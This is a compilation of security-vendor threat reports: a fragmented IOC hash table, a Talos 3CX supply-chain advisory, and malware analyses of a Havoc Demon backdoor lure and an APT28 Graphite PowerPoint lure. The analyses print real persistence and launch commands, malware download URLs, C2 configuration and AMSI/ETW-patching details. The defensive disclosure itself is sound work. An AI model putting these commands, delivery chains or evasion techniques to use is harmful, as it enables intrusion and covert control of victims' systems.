Win64.COBALT.BE CobaltStrike fef79160f0ce9aa9dec15c914f2c2b40b2ae1ec2b0e65e414545dbc994afd73d Trojan.
Win64.COBALT.BE CobaltStrike 3434271f2038afaddad4caad8000e390b3573b2b53e02841653a4ee0dfd73674 Trojan.
Win64.COBALT.BE CobaltStrike 0ac0b3758359855e96367b6c83b0aabdc6cfb59b4caa1cec48632defd21cdf3c Trojan.
Win64.COBALT.BE CobaltStrike 451cef0085dc5b474cc5c68af079d0367d7d2ec73ae2210788beb5297e1fbd6d Trojan.
Win64.COBALT.BE CobaltStrike e710e902507ad63e1d2ce1220212b1a751b70504259457234103bb22845a9424 Trojan.
Win32.QAKBOT.DRSV QakBot 2718dcbb503b6334078daf4af61e17a547fb80c9b811c26cfc9d32f5ce63a826 Trojan.
Win32.QAKBOT.DRTE QakBot abf937fb2f162d1dbbe76c7386c9892db5191e17de586f0a5c49819cd68b5e0f Trojan.
Win32.DEYMA.AM Compiled Remote Desktop Malware bd2c2cf0631d881ed382817afcce2b093f4e412ffb170a719e2762f250abfea4 PUA.Win64.ProcHack.
AC Process Hacker 572d88c419c6ae75aeb784ceab327d040cb589903d6285bbffa77338111af14b HackTool.Win32.NetScan.
AG NetScan 094d1476331d6f693f1d546b53f1c1a42863e6cde014e2ed655f3cbe63e5ecde HackTool.
Win32.ToolPow.
SM PowerTool e8a3e804a96c716a3e9b69195db6ffb0d33e2433af871e4d4e1eab3097237173 PUA.Win32.GMER.YABBI GMER d1aa0ceb01cca76a88f9ee0c5817d24e7a15ad40768430373ae3009a619e2691 PUA.Win64.PCHunter.
B PCHunter bb48f5c915ab7bbbbbf092a20169aaf3ced46b492ed69550854a55254ce10572 Backdoor.
Win32.SWRORT.YXCJ5Z Malware Component e263b9d5467bf724000966da2acfe06520a464c566e4b3d9833213f850f3f1f2 HackTool.
Win32.Adfind.
THLOFBB AdFind ac49c114ef137cc198786ad8daefa9cfcc01f0c0a827b0e2b927a7edd0fca8b0 HackTool.
BAT.RDPEnable.
A RDPEnable 2598e8adb87976abe48f0eba4bbb9a7cb69439e0c133b21aee3845dfccf3fb8f Ransom.Win64.YORAL.SMYXCJCT Royal Ransomware Binary cdd7814074872fc35d18740cdd4e8a5fefcfd6b457fde2920383fd5b11903fc5 Ransom_Royal.
R06CC0DK222 Royal Ransomware Binary a61b71ee73ea8c0f332591e361adeda04705c65b5f4d549066677ec4e71212f7 Ransom.Win32.YORAL.YXCKB Royal Ransomware Binary 56e8bd8b0c5bfb87956f7915bc47a9ecf5d338b804cee1dccacf53400d602be3 Ransom.Win32.YORAL.YECJYT Royal Ransomware Binary Authors Ivan Nicole Chavez Threat Analyst Byron Gelera Threats Analyst Monte de Jesus Threats Analyst Don Ovid Ladores Threats Analyst Khristian Joseph Morales Threats Analyst 
title: Threat Advisory: 3CX Softphone Supply Chain Compromise url: https://blog.talosintelligence.com/3cx-softphone-supply-chain-compromise/ Cisco Talos is tracking and actively responding to a supply chain attack involving the 3CX Desktop Softphone application.
This is a multi-stage attack that involves sideloading DLLs, seven-day sleep routines, and additional payloads dependent on a now-removed GitHub repository for Windows-based systems.
MacOS systems used a different infection chain leveraging a hardcoded C2 domain, as opposed to the GitHub repo.
This is just the latest supply chain attack threatening users, after the SolarWinds incident in 2020 and the REvil ransomware group exploiting Kaseya VSA in 2021.SummaryCisco Talos recently became aware of a supply chain attack affecting Windows and MacOS users of the 3CX software-based phone application.
This attack leveraged the legitimate update functionality of the 3CX application to deliver a set of malicious payloads to 3CX users.
The infection chain consists of several stages and involves sideloading DLLs along with a seven-day sleep cycle before the malware attempts to retrieve additional malicious artifacts from a now-removed GitHub repository for the Windows based infection.
The GitHub repository hosted a series of icon files with encrypted data appended to the end of the files.
These encrypted strings, once decrypted, contained the C2 domains for additional malicious artifacts.
The MacOS version used a hard coded C2 domain.
These second-stage payloads are information stealers that attempt to obtain system information and the latest browsing history records, indicating this information may be used as a filtering mechanism to identify and discard some victims while maintaining unauthorized access to others.
During our investigation we were able to see file activity dating back to February 3, 2023.
However, the GitHub repository has been active since December 2022.
The full scope of the attack is uncertain at this point.
The 3CX website claims to have over 600,000 customers and 12 million daily users.
It's unclear how many are users of the 3CX Desktop App versus the web app option that was not affected.
3CX is currently asking users to use the web app while they work to release an update.
Preparing since February 2022Based on Cisco Talos investigation, it appears the infrastructure that supported this attack was being prepared as early as February 2022 when the domains were first registered.
A second cluster of activity happened toward the end of 2022 when the GitHub repository was created, along with a few other domains.
The sbmsa[.]wiki domain was also created on Feb. 9, 2023, which was found to be used by the second stage of the MacOS version.
The timeline below illustrates these clusters of activity.
Timeline of domain registration activity.
CoverageCisco Secure Endpoint (formerly AMP for Endpoints) is ideally suited to prevent the execution of the malware detailed in this post.
Try Secure Endpoint for free here.
Cisco Secure Email (formerly Cisco Email Security) can block malicious emails sent by threat actors as part of their campaign.
You can try Secure Email for free here.
Cisco Secure Firewall (formerly Next-Generation Firewall and Firepower NGFW) appliances such as Threat Defense Virtual, Adaptive Security Appliance and Meraki MX can detect malicious activity associated with this threat.
Cisco Secure Network/Cloud Analytics (Stealthwatch/Stealthwatch Cloud) analyzes network traffic automatically and alerts users of potentially unwanted activity on every connected device.
Cisco Secure Malware Analytics (Threat Grid) identifies malicious binaries and builds protection into all Cisco Secure products.
Umbrella, Cisco’s secure internet gateway (SIG), blocks users from connecting to malicious domains, IPs and URLs, whether users are on or off the corporate network.
Sign up for a free trial of Umbrella here.
Cisco Secure Web Appliance (formerly Web Security Appliance) automatically blocks potentially dangerous sites and tests suspicious sites before users access them.
Additional protections with context to your specific environment and threat data are available from the Firewall Management Center.
Cisco Duo provides multi-factor authentication for users to ensure only those authorized are accessing your network.
Open-source Snort Subscriber Rule Set customers can stay up to date by downloading the latest rule pack available for purchase on Snort.org.
Talos created the following coverage for this:Snort SIDs:Snort 3: 300480,300481Snort 2: 61550-61553Orbital QueriesCisco Secure Endpoint users can use Orbital Advanced Search to run complex OSqueries to see if their endpoints are infected with this specific threat.
For specific OSqueries on this threat, Cisco Secure Endpoint customers need to make sure that "%3CX%" is entered into the program field under the "Installed Program Search" for Windows and ".*3CX.*" under "Installed Applications Monitoring" for MacOS in Orbital.
Additionally, the users can access the OSQueries directly on GitHub for both Windows and MacOS.Indicators of Compromise (IOCs)Indicators of compromise (IOCs) associated with ongoing activity can be found here. 
title: Malware Disguised as Document from Ukraine's Energoatom Delivers Havoc Demon Backdoor url: https://www.fortinet.com/blog/threat-research/malware-disguised-as-document-ukraine-energoatom-delivers-havoc-demon-backdoor Affected platforms: Microsoft WindowsImpacted parties: Targeted Windows usersImpact: Compromised machines are under the control of the threat actorSeverity level: Medium As part of our ongoing research on malware being used in the Russian-Ukrainian conflict, FortiGuard Labs has encountered a malicious spoofed document pretending to be from the Ukrainian company, Energoatom, a state-owned enterprise that operates Ukraine’s nuclear power plants. 
Since the war with Russia began, Ukraine’s energy sector has been under constant cyberattack.
For example, in April 2022, an attack deploying INDUSTROYER2 and CADDYWIPER wiper malware targeted energy companies.
On 16 August 2022, the Energoatom corporate website was the target of a DDoS attack.
And in October 2022, yet another wiper attack, this one using the wiper dubbed NikoWiper, targeted the energy sector. 
Aside from highlighting the technical details of this latest multi-staged attack, which includes several evasion techniques, this article also discusses some strange artifacts that make us think this could be a work-in-progress or part of a red-team exercise. 
Document Analysis The macro-enabled document is named “zatverdzhenniy_spisok_osib_na_otrim”, which roughly translates to “approved list of persons to receive” in Ukrainian.
It arrives inside an ISO image archive bearing the same filename.
It was first submitted to VirusTotal in mid-March of this year. 
When opened, it displays an image instructing the user to enable Word’s macro code execution to reveal information supposedly protected by M.E. Doc (My Electronic Document).
This popular Ukrainian document management system is used to exchange important and sensitive documents with organizations (including regulatory authorities) in electronic form. 
Blurred content with the logo for Energoatom is displayed behind the instruction, making it appear to be protecting important information (Figure 1).
In reality, it’s just an ordinary image placed on the top layer of the document.
Dragging it to the side reveals the supposedly protected information underneath. 
Figure 1: Fake document Once the macro is enabled, the image disappears, creating the impression that the critical information has somehow been revealed.
The document contains an announcement about a list of people supposedly approved to receive protective equipment (Figure 2). 
Figure 2: Fake document after macro execution VBA Code Analysis To complicate analysis and attempt to evade detection, the macro’s VBA code employs a few interesting techniques. 
The Word application crashes when trying to view or debug the VBA code in the document.
Similarly, when the document composition is analyzed using oletools (a package of python tools used to analyze Microsoft OLE2 files), the tool produces several errors, including stream files that have been defined but are not present within the archive.
The tool also reports an error about an incorrect signature when attempting to decompress a specific stream inside the file.
We have not confirmed if either of these anomalies directly led to the crash above.
Nevertheless, oletools eventually extracted the complete malicious VBA macro code intended to be executed by the document. 
In a likely attempt to make the location of the macro code less obvious, the VBA Project binary file that contains the actual VBA code is redirected to the file “EbDYTPZ.vEypm” instead of the default “vbaProject.bin”. 
This association is detailed in “word\_rels\ document.xml.rels” of the Office Open XML archive with the following line: “<Relationship Id="rId1" Type="http://schemas.microsoft.com/office/2006/relationships/vbaProject" Target="EbDYTPZ.vEypm"/>” As usual, the VBA code is set to execute when the document is opened via AutoOpen and Document_Open events. 
As mentioned, the macro begins by deleting the overlay image, which is internally a Shape object with the Name attribute “happy”.
To find this image, it iterates through all the Shape objects in the document and deletes the one with the same name. 
To hide the strings it uses during its execution, it primarily uses a simple encoding by subtracting 35 from each character of the original string and encoding the result with Base64.
In addition, it uses other operations, such as string reverse and character splitting, prior to decoding. 
As an anti-debugging technique, execution of the primary infection routine uses the Application.
OnTime function commonly used to schedule the execution of a specific VBA procedure instead of directly calling it.
In this case, it schedules the immediate execution of the function “ostrategicy”.
When debugging, this line of code produces the error, “Can’t execute code in break mode”, and then stops executing. 
Figure 3 Code with anti-debugging and image deletion As seen in Figure 3, seemingly random nonsensical comments are also added to the VBA code. 
This malware then checks if a hardcoded path, “C:\Users\user\AppData\Local\Microsoft\Office\OfficeTelemetry.dll”, exists in the system.
As discussed later, this is the same file path where the payload would be written.
This strange implementation detail makes us think this may be a work in progress and could be a test sample created for a threat campaign that will soon be launched. 
The file at the abovementioned path is executed if it exists.
Otherwise, the code extracts the payload that is cleverly stored as a node named “TwXfx” in a custom XML part of the document. 
Custom XML parts is a feature that was introduced with Office Open XML format.
It is used for storing arbitrary data that the document could programmatically access. 
To get to the payload data, it starts by enumerating all the custom XML part objects in the document and then checking if they have a node named “TwXfx”.
That node contains the encoded payload. 
Below is a screenshot of the encoded payload stored in “customXml\item1.xml” of the document archive (Figure 4). 
Figure 4: Encoded binary payload Although the payload in this document is stored in a single node, the VBA code also supports an encoded payload split across several nodes, further complicating its extraction.
In fact, before assuming that the data is stored in a single node, it first checks to determine whether it is stored in several nodes.
It does this by trying to find the node name, in this case, “TwXfx”, with an appended index, i.e., “TwXfx_0”.
If the node exists, it moves on to find the next one by incrementing the index (i.e., TwXfx_1).
It repeats this until it fails to find a node, which means it has reached the end of the payload. 
Once a node is found, the content of the node is read, and its XML tags are removed.
Furthermore, if a string “__b_” is found at the beginning of the data, it is also removed.
Similar to decoding strings, the binary payload is extracted by decoding the data using Base64 and adding 35.
Only this time, the resulting bytes are further decoded with xor 82.
The decoded payload is a 64-bit executable (.exe). 
The storage of a payload binary as a custom XML part of the document is a technique very similar to what’s presented in this blog from the website mgeeky.tech.
Even on the code level, there are striking similarities between the code used by the malicious document and what’s presented in that blog.
The website author offers a private tool that provides similar capabilities.
Still, the creator of this malicious document could have easily replicated the technique from the publicly available PoC linked in the blog.
Figure 5 shows one of the several code similarities observed in the function for locating the payload node in the document. 
Figure 5: Comparison of code in document vs. blog Once the payload is decoded, it is written to the hardcoded path “C:\Users\user\AppData\Local\Microsoft\Office\OfficeTelemetry.dll” and executed using ShellExecute with the following command line: 
C:\Windows\System32\conhost.exe --headless "C:\Users\user\AppData\Local\Microsoft\Office\OfficeTelemetry.dll" "” This eventually leads to the execution of a Havoc Demon agent, as discussed in the next section. 
Payload Analysis Stage 1: OfficeTelemetry.dll Based on the filename of the payload binary, it tries to masquerade as a legitimate component of Microsoft Office.
It is even signed with an invalid portal.office.com certificate (Figure 6). 
Figure 6: Fake portal.office.com code signing certificate While this file has a DLL extension and contains multiple exports (Figure 7), it is a standalone EXE file. 
Figure 7: Functions exported by OfficeTelemetry.dll Upon execution, it locates a packed and compressed payload in the .vdata section (Figure 8) of the memory allocated for the current process. 
Figure 8: Encrypted and compressed payload in .vdata section 
The payload storage is structured as follows: 
1. Offset 0x0: Magic (8 bytes) 2. Offset 0x8: Encrypted flag (0 = not encrypted, 3 = RC4 encryption) 
3. Offset 0x9: Compression flag (0 = not compressed, 3 = LZNT1 compression) 4. Offset 0xa: RC4 key (64 bytes) 5. 0ffset 0x4a:
Compressed size (4 bytes) 6. Offset 0x4e: Uncompressed size (4 bytes) 7. Offset 0x52: Loader configuration string length (2 bytes) 8. Offset 0x154: Start of encrypted and compressed loader configuration and payload After decrypting and decompressing the payload, we see a pipe-delimited configuration followed by the actual shellcode to be executed (Figure 9). 
Figure 9: Decrypted and decompressed payload The loader configuration format is as follows: Field 1: Injection type: Current process (1) or in the new process (2) Field 2: Flag to wait for injection thread to terminate before terminating loader (injection type 1 only) 
Field 3: Process to inject into (injection type 2 only) 
Field 4: Process to inject into (injection type 2 only) 
Field 5: Flag to write empty file to %TEMP% upon successful injection Field 6: Wait timeout used for Windows events within the code Field 7: Unknown flag used (injection type 1 only) Field 8: Flag to enable sleep obfuscation after creating an injected thread (injection type 1 only) Field 9: Flag to enable sleep obfuscation via a separate thread Field 10: Flag to enable sleep obfuscation Field 11: Flag to patch APIs After parsing the configuration, this loader prepends a stub containing 79 bytes of junk instructions before the actual payload shellcode.
The bytes at 25 hardcoded offsets within this stub are replaced with random bytes to hinder shellcode detection. 
It first ensures that a file within the %TEMP% does not exist before attempting to launch the payload.
The name of this file is derived from a value computed from hour / 3 + year + month + day of the current time.
Hence, the payload will only be executed up to 8 times per day. 
To launch the shellcode, the loader calls ZwCreateThreadEx to create a new suspended injection thread hidden from debuggers using the THREAD_CREATE_FLAGS_CREATE_SUSPENDED (0x01) and THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER (0x4) thread creation flags.
By removing the THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER flag before the ZwCreateThreadEx call and using memory breakpoints, the shellcode can be debugged in the usual manner when the thread resumes execution. 
While not enabled in this sample, the loader also supports sleep obfuscation to hinder detection by memory scanners.
It does this by redirecting calls to the Windows Sleep API to its own function that performs the following: 1. Suspends all threads in the current process 
2. 
Reverts the patched Sleep API code bytes 3. 
Reverts patches to security APIs (only if patching was configured) 4. Encodes sensitive memory regions in the current process with a randomized XOR key 5. Calls Sleep with the specified timeout 6. 
Decodes sensitive memory regions in the current process with the same XOR key 7. Patches security-related APIs to disable them 8. 
Patches Sleep to redirect to this function again 9. Resumes all threads in the current process 
The patched APIs are: WldpQueryDynamicCodeTrust in wldp.dll AmsiScanBuffer in amsi.dll EtwEventWrite in ntdll.dll Interestingly, well-known Cobalt Strike configuration field names (Figure 10) are also found in plaintext within the sample, possibly to confuse static analysis tools. 
Figure 10: Cobalt Strike configuration field strings in sample Stage 2: KaynLdr The second stage consists of a shellcode with a Havoc C2 agent DLL appended to it.
Havoc C2 framework is an open-source post-exploitation toolkit developed by C5pider and comprises the following components: Demon agent: Deployed on infected machines and communicates with configured Teamserver Teamserver: Command & Control (C2) server that manages communications with agents Client: Used by threat actor(s) to connect to a Teamserver for managing and issuing commands to connected agents.
As the client is not deployed as part of the infection, it will not be discussed further in this article. 
The shellcode looks for 0x4d 0x5a and 0x50 0x45 bytes that denote the “MZ" and “PE” headers of a Windows PE executable file to locate the payload in memory.
It then calls the loader (referred to internally as KaynLdr in the source code) 
KaynLdr resolves the LdrLoadDll, ZwAllocateVirtualMemory, and NtProtectVirtualMemory Native APIs via API hashing before using them to allocate memory, load the Demon agent payload, and execute it directly from memory. 
The relevant API hashes are: 
LdrLoadDll: 0x9e456a43 NtAllocateVirtualMemory: 0xf783b8ec NtProtectVirtualMemory: 0x50e92888 Stage 3: Havoc Demon agent The DLL loaded by KaynLdr is the Havoc Demon agent, which is analogous to Beacon for the popular Cobalt Strike framework.
The configuration is embedded within the Demon sample. 
Demon communicates with the C2 server specified in the configuration via HTTP or HTTPS POST requests.
A randomized 256-bit key and 128-bit IV are generated and shared with the C2 server on the initial check-in request (Figure 11) for encrypting subsequent data communicated between the agent and C2 server with AES-256-CTR. Figure 11:
Check in request data structure The relevant fields in the check-in request are as follows: 1. Size of data package 2. Magic value:
0xDE 0xAD 0xBE 0xEF
(hardcoded into Havoc) 3. Agent ID 4. Command ID: 0x63 (DEMON_INITIALIZE) 5. 32-byte AES key 6. 16-byte AES IV 7. AES-encrypted data While Demon can be configured to rotate among multiple C2 domains, only one C2 domain, "ukrtatnafta[.]org", is specified for this sample.
This domain is very similar to ukrtatnafta[.]com, owned by Ukrtatnafta, a Ukrainian oil refining company. 
To blend in with legitimate HTTP/HTTPS traffic, Demon randomly picks one of several URIs set in the configuration and applies a specified list of HTTP headers in the requests to the C2.
The Teamserver C2 configuration extracted from this sample can be seen below. 
Host: ukrtatnafta[.]org:443 HTTPS: True Proxy enabled: No Method: POST Headers:Content-Type: application/javascript Pragma: public ETag: W/736fh0-3e Last-Modified: Mon, 05 Dec 2016 14:54:50 GMT Server: nginx/1.14.2 Connection: keep-alive Expires: Mon, 06 Mar 2023 13:23:47 GMT User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)
Chrome/108.0.0.0 Safari/537.36 URIs:/wp-content/themes/pressa/js/avias.js /wp-content/themes/pressa/js/mobile_menu.js /wp-content/plugins/contact-form-7/includes/js/scripts.js /wp-content/themes/pressa/js/bootstrap.js /wp-content/themes/pressa/js/hovermenu.js /wp-content/themes/pressa/js/retina-1.1.0.js /wp-content/plugins/js_composer/assets/lib/bower/isotope/dist/isotope.pkgd.min.js /wp-content/themes/pressa/js/custom-script.js /wp-includes/js/wp-emoji-release.min.js /maps-api-v3/api/js/52/1/intl/uk_ALL/util.js /wp-includes/js/wp-embed.min.js The major features of Demon include: Enumerate host and network info (users, groups, domains, shares, etc.) 
Execute commands via Command Prompt Execute PowerShell commands Inject and execute DLLs, shellcode, .NET assemblies, Cobalt Strike BOF files Manipulate processes (list, create, search, kill, etc.) Manipulate files and directories (list, download, upload, view, delete, etc.) 
Manipulate access tokens (steal, impersonate, etc.) Take screenshots As this Demon sample was unmodified from the version in Github, we will not analyze it in detail here.
Interested readers may refer to the documentation and source code on GitHub. 
Conclusion This malware campaign showcases some interesting techniques threat actors use to evade detection and hinder analysis.
Using a combination of such techniques, threat actors may gain sufficient time to complete their post-exploitation commands upon successful infection before they are detected. 
Although the document contains some indicators of a potential red-team exercise, e.g., the hardcoded path for persisting the payload on disk and use of a relatively novel payload encoding technique, it is also entirely possible that this could be a campaign under development as many red-team tools have been weaponized recently for malicious purposes.
As this document delivers a backdoor that will silently provide control over the infected user’s system to a remote operator with unknown intentions, it is safer to err on the side of caution and ensure protections are in place. 
The increasing use of open-source offensive security frameworks is a double-edged sword. 
On the one hand, both red and blue teams can benefit from the availability of the source code to better understand how these techniques work, address detection gaps, and improve the cyber resilience of their organizations.
On the other hand, it enables threat actors to abuse these frameworks to conduct attacks without developing or purchasing custom malware. 
Fortinet Protections FortiGuard AntiVirus detects the malicious files identified in this report as VBA/Havoc.
FGLT!tr W64/Havoc.
FGLTA!tr.bdr W64/Havoc.
FGLTB!tr.bdr The FortiGuard AntiVirus service is supported by FortiGate, FortiMail, FortiClient, and FortiEDR.
The Fortinet AntiVirus engine is a part of each of those solutions.
As a result, customers who have these products with up-to-date protections are protected. 
This type of threats is usually delivered as email attachments.
FortiMail can detect and quarantine the malicious attachments for such campaigns. 
Fortinet’s CDR (Content Disarm and Reconstruction) service can neutralize the embedded macros inside the Word document. 
The FortiGuard Web Filtering Service detects the C2 URLs cited in this report as Malicious and blocks them. 
FortiGuard Labs provides Backdoor.
Havoc.
Agent IPS signature to block Havoc C2 network communications. 
Due to the ease of disruption, damage to daily operations, potential impact to an organization's reputation, and the unwanted destruction or release of PII, etc., it is important to keep all AV and IPS signatures up to date. 
We also suggest that organizations have their end users undergo our free NSE training: NSE 1 – Information Security Awareness.
It includes a module on internet threats designed to help end users learn how to identify and protect themselves from various types of phishing attacks. 
If you believe these or any other cybersecurity threat has impacted your organization, please contact our Global FortiGuard Incident Response Team. 
IOCs File Hashes b773fa65bb375e6fe6d387f301f6bf33219189ea1d4a06762e965a9eba7de4e8 17637fac7f989549acd248ca9e5293d2b9a1a2e4bb0f7e4edf5571df35129f0c 9f797d705facebd1687b7765cbf65231e71821eb3c38dcc171a3fc88b9f52328 b6cb8a7cdce0bfd3a7402d22fb0014dedb259d6c91c1538ac74097b8ca22ca5c C2 URLs hxxps://ukrtatnafta[.]org hxxps://ukrtatnafta[.]org/wp-content/themes/pressa/js/avias.js hxxps://ukrtatnafta[.]org/wp-content/themes/pressa/js/mobile_menu.js hxxps://ukrtatnafta[.]org/wp-content/plugins/contact-form-7/includes/js/scripts.js hxxps://ukrtatnafta[.]org/wp-content/themes/pressa/js/bootstrap.js hxxps://ukrtatnafta[.]org/wp-content/themes/pressa/js/hovermenu.js hxxps://ukrtatnafta[.]org/wp-content/themes/pressa/js/retina-1.1.0.js hxxps://ukrtatnafta[.]org/wp-content/plugins/js_composer/assets/lib/bower/isotope/dist/isotope.pkgd.min.js hxxps://ukrtatnafta[.]org/wp-content/themes/pressa/js/custom-script.js hxxps://ukrtatnafta[.]org/wp-includes/js/wp-emoji-release.min.js hxxps://ukrtatnafta[.]org/maps-api-v3/api/js/52/1/intl/uk_ALL/util.js hxxps://ukrtatnafta[.]org/wp-includes/js/wp-embed.min.js 
title:
In the footsteps of the Fancy Bear: PowerPoint mouse-over event abused to deliver Graphite implants url: https://blog.cluster25.duskrise.com/2022/09/23/in-the-footsteps-of-the-fancy-bear-powerpoint-graphite/ By Cluster25 Threat Intel Team September 23, 2022 
Cluster25 researchers collected and analyzed a lure document used to implant a variant of Graphite malware, uniquely linked to the threat actor known as APT28 (aka Fancy Bear, TSAR Team).
This is a threat group attributed to Russia’s Main Intelligence Directorate of the Russian General Staff by a July 2018 U.S. Department of Justice indictment.
The lure document is a PowerPoint file that exploits a code execution technique, which is designed to be triggered when the user starts the presentation mode and moves the mouse.
The code execution runs a PowerShell script that downloads and executes a dropper from OneDrive.
The latter downloads a payload that extracts and injects in itself a new PE (Portable Executable) file, that the analysis showed to be a variant of a malware family known as Graphite, that uses the Microsoft Graph API and OneDrive for C&C communications. 
INSIGHTS 
According to lure document metadata, attackers used a template potentially linked to The Organisation for Economic Co-operation and Development (OECD).
This organization works together with governments, policy makers and citizens in order to establish evidence-based international standards and finding solutions to a range of social, economic and environmental challenges.
This is a PowerPoint file (PPT) containing two slides with the same content, the first one written in English and the second in French.
The document shows instructions about the use of the Interpretation option available in Zoom. 
Lure document content This PowerPoint exploits a code execution technique that is triggered by using Hyperlinks instead of Run Program / Macro, which is designed to be triggered when the user starts the presentation mode and moves the mouse.
The code that is executed is a PowerShell script shown below, which is run through the utility SyncAppvPublishingServer, and performs the download of a file from OneDrive with a JPEG extension (DSC0002.jpeg).
This in turn is a DLL file that is later decrypted and written to the local path C:\ProgramData\lmapi2.dll. 
PowerShell Script The full URL used to download the DLL is reported below: URL https[:]\\9b5uja[.]am[.]files[.]1drv[.]com/y4mpYJ245I931DUGr7BV-dwLD7SReTqFr1N7eQOKSH_ug2G18Jd6i3SRqYqgugj3FA2JQQ7JqclvWH13Br3B5Ux-F6QcqADr-FowC_9PZi1Aj7uckcK8Uix_7ja1tF6C_8-5xYgm6zwjbXsrlEcTEenAyA8BzEaGPudutl1wMDkzVr6Wmn8_qRmYejLgbNoQmPTUe3P5NKFFLRjeeU_JhvA/DSC0002.jpeg?download 
The execution triggers the setting of the following registry key with the value C:\ProgramData\lmapi2.dll to achieve persistence. 
REG KEY HKCU\Software\Classes\CLSID\{2735412E-7F64-5B0F-8F00-5D77AFBE261E}\InProcServer32 and the execution of the downloaded DLL via the tool
rundll32.exe. 
The following syntax is responsible to perform the whole set of operations: COMMAND /c reg ADD HKCU\Software\Classes\CLSID\{2735412E-7F64-5B0F-8F00-5D77AFBE261E}\InProcServer32 /tREG_SZ /d
C:\ProgramData\lmapi2.dll /ve /f /reg:64 && rundll32.exe
C:\ProgramData\lmapi2.dll,#1 The DLL file lmapi2.dll is a 64-bit PE file with the compiler timestamp Mon Jan 17 08:10:01 2022 | UTC.
It creates a new thread, in which a new mutex is created with the name 56rd68kow.
If the mutex doesn’t already exists, the malware makes another request to OneDrive using the following URL: URL https[:]//kdmzlw[.]am[.]files[.]1drv[.]com/y4mv4glUgvW9nl8z8GU71PhPw0oRtve9QpZ0pEgwJN1q_TlGY5yl5Mvkrc5rUh0Uxxknlr1qymWyCbPrkKOFgL4CARScSn9UMhq3c5hSNOQsDOamYLmOfN61lUtQO10vxtn0I7QROJdOtQ42wDsaiACGR5ZrmYwt0SmZkphGWQpT2gOFrsUxjg8_7QT01VTABiGr3T6xpWrTmFT5yu4toQ/DSC0001.jpeg?download" A new file, again with a JPEG extension (DSC0001.jpeg), is downloaded and decrypted using the RSA and AES Cryptographic Provider from WinCrypt APIs, with a hardcoded public key.
Then, the malware dynamically calls the API NtAllocateVirtualMemory and then writes and executes the decrypted content in the newly allocated memory region.
Similarly, the imported code dynamically calls VirtualAlloc to allocate a new region of memory in which a new PE file is copied.
Finally, it passes the execution to the region of memory in which the copied PE is allocated, as evidence reported following: The code in the injected PE creates another mutex having the name 42Htb600y.
The malware proceeds to de-obfuscate strings using a XOR loop and using a different XOR key for each string.
The following is an exhaustive list of de-obfuscated strings: DE-OBFUSCATED STRINGS \\.\root\CIMV2SELECT UUID FROM Win32_ComputerSystemProduct"WQL”L"UUID”"Unknown CLR”L"pwrshplugin.dll”L"kernel32.dll”"RtlGetVersion”"RtlRandomEx”"RtlIntegerToUnicodeString”"RtlDecompressBuffer”"RtlGetCompressionWorkSpaceSize”"RtlCompressBuffer”"RtlComputeCrc32”"Windows 2000”"Windows XP”"Windows XP Professional”"Windows Server 2003”"Windows
Home Server”"Windows Server 2003 R2”"Windows Vista”"Windows Server 2008”"Windows Server 2008 R2”"Windows
7”"Windows Server 2012”"Windows 8”"Windows Server 2016”"Windows 10”"Unidentified”"64bit”"32bit”"NtQuerySystemInformation”"GetCLRVersionForPSVersion”"NtOpenThread”"NtAllocateVirtualMemory”"Shell of task = %d ended with code
= %d”"User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:87.0) Gecko/20210101 Firefox/87.0”"User-Agent: “"chunked”"access_token”"refresh_token”"value”"file”"name”"/v1.0/drive/root:/%s/update/%s:/content”"/v1.0/drive/root:/%s/check/%s:/content”"/v1.0/drive/root:/%s/check/%s”"/v1.0/drive/root:/%s/check:/children”"/common/oauth2/v2.0/token”"login.microsoftonline.com""graph.microsoft.com""Content-Type: application/json”"Content-Type: application/x-www-form-urlencoded”"Content-Type: application/octet-stream”"Content-Type: application/xml”"client_id=%s&redirect_uri=urn:ietf:wg:oauth:2.0:oob&refresh_token=%s&grant_type=refresh_token”"Authorization: bearer “"DELETE”“GET”“POST”“PUT”L"ntdll.dll”L"secur32.dll”"NtOpenKey”"NtQueryValueKey”"NtSetValueKey”"NtClose”"RtlInitUnicodeString”"RtlFreeUnicodeString”L"\\Registry\\Machine\\SOFTWARE\\Microsoft\\Cryptography”L"MachineGuid”"Accept: /""Accept-Encoding: gzip, deflate”"User-Agent: Microsoft skyDriveSync %s ship”L"\\Registry\\User\\%s\\Control Panel\\International\\User Profile”L"Recharge”"RtlConvertSidToUnicodeString”"WTSQueryUserToken”"sprintf” C&C COMMUNICATIONS 
The malware communicates with the Command and Control (C&C) through the domain graph[.]Microsoft[.]com, i.e. abusing the Microsoft Graph service, which is the API Web RESTful that provides access to Microsoft Cloud service resources.
Hence, the analysis showed that the sample in question is a version of the Graphite malware, a malware using the Microsoft Graph API and OneDrive for C&C communications.
The malware is known to be deployed in-memory only and served as a downloader for the post-exploitation frameworks like Empire (as documented by Trellix researchers on early 2022 here).
To obtain a new OAuth2 token to access the service, the endpoint login[.]microsoftonline[.]com/common/oauth2/v2.0/token is contacted using a fixed client ID (62272a08-fe9d-4825-bc65-203842ff92bc), as evidence below: The following is the full HTTP request to make the first connection to the C&C. HTTP REQUEST POST https://login.microsoftonline.com/common/oauth2/v2.0/token HTTP/1.1User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; Win64; x64; Trident/7.0; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET
CLR 3.5.30729)Content-Type: application/x-www-form-urlencodedHost: login.microsoftonline.comContent-Length: 459Connection: Keep-AliveCache-Control: no-cacheclient_id=62272a08-fe9d-4825-bc65-203842ff92bc&redirect_uri=urn:ietf:wg:oauth:2.0:oob&refresh_token=M.R3_BAY.-CVmbPSAFzt2n5JiYAwjQRpC6Yh*f45Zsz9XKTHMo4G1ZeR0UDVRbJhp8T7Df*ARh8tTfRKRZZ8YzFEYMRJ!VPP!GJPZsfeTb0SMIF!gXQ0sUli*gTjLrdaTxOnwndJcUIqtbY8D8ZCFI4lC3pEE3KW7ED!svw*kKb1rojgehD1Sa70lDuVa86awTeZrh8lyBh9m9vdudqoqVNLyRpLyHd*di1s2G6ub9MjH9BVoDVrDaqmJvUsMonxqqhqx!iwwU1ptzd1WngCv9BCmVtxgFTJBPR1bJ2Ze17e0N6W3VHZC2FQOOUhu4nQ2Wrj0qLEBowQ$$&grant_type=refresh_token Once obtained a new OAuth2 token, the Graphite malware will query the Microsoft GraphAPIs for new commands by enumerating the child files in the check OneDrive subdirectory.
